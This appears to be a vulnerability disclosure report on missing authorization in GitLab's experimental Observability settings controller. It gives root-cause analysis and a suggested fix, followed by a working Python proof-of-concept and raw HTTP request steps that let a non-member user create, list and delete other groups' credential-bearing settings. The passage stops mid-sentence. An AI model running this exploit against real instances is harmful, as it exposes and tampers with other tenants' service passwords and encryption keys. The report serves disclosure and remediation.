### Summary

The experimental, feature-flagged Observability settings controller `Experimental::O11yServiceSettingsController` (routes under `/-/experimental/o11y_service_settings`) performs **no object-level authorization**. Its only gates are `authenticate_user!` and a feature-flag check (`Feature.enabled?(:experimental_group_o11y_settings_access, current_user)`).

As a result, **any signed-in, non-admin user who is selected into the `experimental_group_o11y_settings_access` feature flag can create, list, update, and delete the Observability (O11y) service settings of *arbitrary* groups** including groups they do not own, administer, or belong to. The stored data includes the group's O11y service name, user email, **service password, and post-message encryption key**.

This is a missing-authorization flaw (CWE-862). The equivalent group-scoped controller (`Groups::Observability::O11yServiceSettingsController`) *does* enforce object-level permissions (`:update_o11y_settings` / `:delete_o11y_settings` on the target group), which shows the intended authorization model the experimental controller omits.

### Root cause analysis
**1. Global route, no implicit scoping.** The experimental controller is mounted as a *top-level* resource (`config/routes.rb:284`):
```ruby
resources :o11y_service_settings, only: [:index, :new, :create, :edit, :update, :destroy]   # under /-/experimental
```
whereas the legitimate controller is a group-*nested* singular resource (`config/routes/group.rb:200`):
```ruby
resource :o11y_service_settings, only: [:update, :edit, :destroy]   # under /groups/:group_id
```
Because the experimental route carries no `:group_id` in the path, there is no implicit group scope authorization *must* be enforced in the controller. It is not.

**2. The only `before_action` is a per-user availability gate, not per-object authz.**
```ruby
def authorize_experimental_access!
  render_404 unless ::Feature.enabled?(:experimental_group_o11y_settings_access, current_user)
end
```
This answers "may this user use the feature?" it never answers "may this user act on *this group's* settings?". The developer conflated feature availability with object-level authorization.

**3. Every action trusts attacker-controlled identifiers:**
- `create`:  `Group.find_by_id(o11y_service_settings_params[:group_id])`: the target group is taken straight from request params; any existing `group_id` is accepted.
- `index`: `Observability::GroupO11ySetting.with_group` where `scope :with_group → includes(:group)` is **not** an authorization scope (it only eager-loads the association). The optional `search_by_group_id` (`where(group_id:)`) is a plain attacker-controlled filter, so the index both lists *all* groups' settings and lets the attacker target any specific group.
- `update` / `destroy`:`find_o11y_service_setting` = `Observability::GroupO11ySetting.find_by_id(params[:id])`: a global lookup by primary key, never joined to groups the user may administer.

**4. The exposed data is sensitive (credentials), and is returned decrypted.** The model stores secrets encrypted at rest:
```ruby
# app/models/observability/group_o11y_setting.rb
belongs_to :group
encrypts :o11y_service_password, :o11y_service_post_message_encryption_key
```
but `edit` loads the record and the model transparently decrypts these attributes for rendering, so reaching `/-/experimental/o11y_service_settings/:id/edit` discloses another group's **cleartext** service password and post-message encryption key not just metadata.

**5. The secure sibling proves intent.** `Groups::Observability::O11yServiceSettingsController` implements the same operations but gates them on the resolved group:
```ruby
before_action :authorize_o11y_settings_access!                 # :update_o11y_settings on group
before_action :authorize_o11y_destroy_access!, only: :destroy  # :delete_o11y_settings on group
```
The experimental controller re-implemented the CRUD surface globally and dropped these `Ability.allowed?` checks. i.e. this is an omission, not intended behavior.

**Suggested fix.** In each experimental action, resolve the group and enforce the same abilities used by the group-scoped controller, and scope `index` to authorized groups, e.g.:
```ruby
group = Group.find_by_id(params...)            # create: from params; update/destroy: via setting.group
render_404 unless group && Ability.allowed?(current_user, :update_o11y_settings, group)   # :delete_o11y_settings for destroy
# index: only settings whose group the user may read O11y settings for
```
Keep the feature flag as an availability gate, but it must not be the *only* gate.


### Steps to reproduce

**Precondition:** An instance administrator has enabled the `experimental_group_o11y_settings_access` feature flag for the attacker's user (this flag is `default_enabled: false` / `type: experiment`; see Impact for scope notes). The attacker is an ordinary user with **no membership or role** in the victim group.

#### PoC
```python
#!/usr/bin/env python3
import argparse
import os
import random
import re
import string
import sys
import time

cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in ("", cwd)]

import requests

def load_curl_cookie_jar(session, path):
    with open(path, "r", encoding="utf-8") as f:
        for raw in f:
            line = raw.rstrip("\n")
            if line.startswith("#HttpOnly_"):
                line = line[len("#HttpOnly_"):]
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) < 7:
                continue
            domain, _flag, cookie_path, secure, _expires, name, value = parts[:7]
            session.cookies.set(name, value, domain=domain.lstrip("."), path=cookie_path or "/", secure=(secure.upper() == "TRUE"))

def token_from(html):
    for pattern in (r'name="csrf-token" content="([^"]+)"', r'name="authenticity_token" value="([^"]+)"'):
        m = re.search(pattern, html)
        if m:
            return m.group(1)
    return None

def csrf(session, base_url):
    r = session.get(f"{base_url}/-/user_settings/profile", timeout=15)
    t = token_from(r.text)
    if not t:
        raise RuntimeError(f"could not obtain CSRF token; status={r.status_code}")
    return t

def show(label, response):
    body = response.text[:240].replace("\n", " ")
    print(f"{label}: status={response.status_code} location={response.headers.get('Location')} body={body!r}")

def parse_setting_id(html):
    m = re.search(r"/experimental/o11y_service_settings/(\d+)/edit", html)
    return m.group(1) if m else None

def main():
    parser = argparse.ArgumentParser(description="Reproduce experimental O11y settings broken access control")
    parser.add_argument("--base-url", default="http://wsl.evm.pics:31655")
    parser.add_argument("--root-cookie-jar", default="/tmp/tf_gitlab_root.jar")
    parser.add_argument("--dev-cookie-jar", default="/tmp/tf_gitlab_dev.jar")
    parser.add_argument("--dev-username", default="tfdev2")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    root = requests.Session()
    dev = requests.Session()
    load_curl_cookie_jar(root, args.root_cookie_jar)
    load_curl_cookie_jar(dev, args.dev_cookie_jar)

    suffix = str(int(time.time())) + "".join(random.choice(string.ascii_lowercase) for _ in range(5))
    group_id = None
    setting_id = None
    flag_name = "experimental_group_o11y_settings_access"

    try:
        t = csrf(root, base_url)
        r = root.post(
            f"{base_url}/api/v4/groups",
            headers={"X-CSRF-Token": t},
            data={"name": f"TF O11y BAC {suffix}", "path": f"tf-o11y-bac-{suffix}", "visibility": "private"},
            timeout=30,
        )
        show("create_victim_group_as_root", r)
        r.raise_for_status()
        group_id = r.json()["id"]

        before = dev.get(f"{base_url}/-/experimental/o11y_service_settings/new", timeout=15)
        show("dev_new_before_feature_flag", before)

        t = csrf(root, base_url)
        r = root.post(
            f"{base_url}/api/v4/features/{flag_name}",
            headers={"X-CSRF-Token": t},
            data={"value": "true", "user": args.dev_username},
            timeout=20,
        )
        show("enable_feature_for_dev", r)
        r.raise_for_status()

        after = dev.get(f"{base_url}/-/experimental/o11y_service_settings/new", timeout=15)
        show("dev_new_after_feature_flag", after)
        if after.status_code != 200:
            print("FAIL feature-flagged dev user could not reach experimental form")
            return 2

        t = csrf(dev, base_url)
        r = dev.post(
            f"{base_url}/-/experimental/o11y_service_settings",
            headers={"X-CSRF-Token": t},
            data={
                "observability_group_o11y_setting[group_id]": str(group_id),
                "observability_group_o11y_setting[o11y_service_name]": f"tf-o11y-{suffix}",
                "observability_group_o11y_setting[o11y_service_user_email]": f"tf-o11y-{suffix}@example.com",
                "observability_group_o11y_setting[o11y_service_password]": f"tf-o11y-password-{suffix}",
                "observability_group_o11y_setting[o11y_service_post_message_encryption_key]": f"tf-o11y-key-{suffix}-012345678901234567890123456789",
            },
            allow_redirects=False,
            timeout=30,
        )
        show("dev_create_root_group_setting", r)
        create_ok = r.status_code in (302, 303)

        r = dev.get(f"{base_url}/-/experimental/o11y_service_settings?group_id={group_id}", timeout=20)
        show("dev_index_root_group_setting", r)
        setting_id = parse_setting_id(r.text)
        print(f"SETTING_ID={setting_id}")

        delete_ok = False
        if setting_id:
            t = csrf(dev, base_url)
            r = dev.delete(
                f"{base_url}/-/experimental/o11y_service_settings/{setting_id}",
                headers={"X-CSRF-Token": t},
                allow_redirects=False,
                timeout=20,
            )
            show("dev_delete_root_group_setting", r)
            delete_ok = r.status_code in (302, 303)
            if delete_ok:
                setting_id = None

        if create_ok and delete_ok:
            print(f"PASS low-privileged feature-flagged user created and deleted O11y settings for root-owned group_id={group_id}")
            return 0
        print("FAIL expected dev create and delete redirects did not both occur")
        return 2
    finally:
        if setting_id:
            try:
                t = csrf(dev, base_url)
                r = dev.delete(f"{base_url}/-/experimental/o11y_service_settings/{setting_id}", headers={"X-CSRF-Token": t}, allow_redirects=False, timeout=20)
                show("cleanup_setting_delete", r)
            except Exception as exc:
                print(f"cleanup_setting_delete_error: {exc}")
        try:
            t = csrf(root, base_url)
            r = root.delete(f"{base_url}/api/v4/features/{flag_name}", headers={"X-CSRF-Token": t}, timeout=20)
            show("cleanup_feature_flag_delete", r)
        except Exception as exc:
            print(f"cleanup_feature_flag_delete_error: {exc}")
        if group_id:
            try:
                t = csrf(root, base_url)
                r = root.delete(f"{base_url}/api/v4/groups/{group_id}", headers={"X-CSRF-Token": t}, timeout=30)
                show("cleanup_group_delete", r)
            except Exception as exc:
                print(f"cleanup_group_delete_error: {exc}")

if __name__ == "__main__":
    raise SystemExit(main())
```

Two accounts are used:
- `root` (admin): only used to create a victim group and to enable the flag (simulating the rollout).
- `tfdev2`: ordinary, non-admin user; **not a member** of the victim group. This is the attacker.

1. **(setup, as admin)** Create a private victim group owned by `root`:
   ```
   POST /api/v4/groups   name=Victim, path=victim-XXXX, visibility=private   -> 201, group_id=7
   ```

2. **(attacker, flag OFF)** Confirm the experimental endpoint is not reachable yet:
   ```
   GET /-/experimental/o11y_service_settings/new        (session: tfdev2)  -> 404
   ```

3. **(setup, as admin)** Enable the experiment flag for the attacker only (simulating a rollout cohort):
   ```
   POST /api/v4/features/experimental_group_o11y_settings_access   value=true&user=tfdev2   -> 201
   ```

4. **(attacker, flag ON)** The experimental form is now reachable:
   ```
   GET /-/experimental/o11y_service_settings/new        (session: tfdev2)  -> 200
   ```

5. **(attacker)** Create O11y settings, **including credentials, for the victim group (`group_id=7`) the attacker does not belong to**:
   ```
   POST /-/experimental/o11y_service_settings           (session: tfdev2, valid CSRF)
     observability_group_o11y_setting[group_id]=7
     observability_group_o11y_setting[o11y_service_name]=pwn
     observability_group_o11y_setting[o11y_service_user_email]=pwn@example.com
     observability_group_o11y_setting[o11y_service_password]=pwn-pass
     observability_group_o11y_setting[o11y_service_post_message_encryption_key]=pwnkey-0123456789012345678901234567890
   -> 302 (created)
   ```

6. **(attacker)** Enumerate settings globally / for the victim group via the experimental index, and recover the setting id:
   ```
   GET /-/experimental/o11y_service_settings?group_id=7  (session: tfdev2)  -> 200, exposes /experimental/o11y_service_settings/1/edit
   ```

7. **(attacker)** Delete the victim group's setting:
   ```
   DELETE /-/experimental/o11y_service_settings/1        (session: tfdev2, valid CSRF)  -> 303 (deleted)
   ```

A self-contained script (`poc.py`) automates steps 1–7 and cleans up afterward.

```
GET    /-/experimental/o11y_service_settings/new        (flag off) -> 404
GET    /-/experimental/o11y_service_settings/new        (flag on)  -> 200
POST   /-/experimental/o11y_service_settings            group_id=7 -> 302  (created on a group the attacker is not in)
GET    /-/experimental/o11y_service_settings?group_id=7            -> 200  (lists it; exposes edit link / id)
DELETE /-/experimental/o11y_service_settings/1                     -> 303  (deleted)
```

### What is the expected *correct* behavior?

Each action should enforce object-level authorization on the resolved group, exactly as the group-scoped controller does. e.g. `render_404 unless Ability.allowed?(current_user, :update_o11y_settings, group)` for create/update and `:delete_o11y_settings` for destroy, and `index` should be scoped to groups the user is authorized to read O11y settings for. The feature flag should gate feature *availability*, not replace per-object authorization.

## Impact

A non-administrative user who is merely included in the `experimental_group_o11y_settings_access` feature-flag cohort can **read, create, modify, and destroy Observability service settings for any group on the instance**, with no group membership or permission check. Concretely the attacker can:

- **Disclose** other groups' O11y integration credentials (service password, post-message encryption key, user email) by listing settings globally.
- **Tamper** with other groups' observability configuration (e.g., repoint a victim group's O11y service to an attacker-controlled endpoint).
- **Delete** other groups' observability settings (integrity / availability).

This breaks the tenant isolation that the parallel group-scoped controller enforces. Classification: **CWE-862 Missing Authorization (Broken Access Control)**.

### What is the current *bug* behavior?

With the feature flag enabled for a non-admin user, every action in `Experimental::O11yServiceSettingsController` operates on a raw, request-supplied `group_id` (create) or setting `id` (update/destroy), and `index` returns settings for **all** groups. No check verifies that `current_user` may administer the target group. Observed results (attacker session `tfdev2`, victim group owned by `root`):
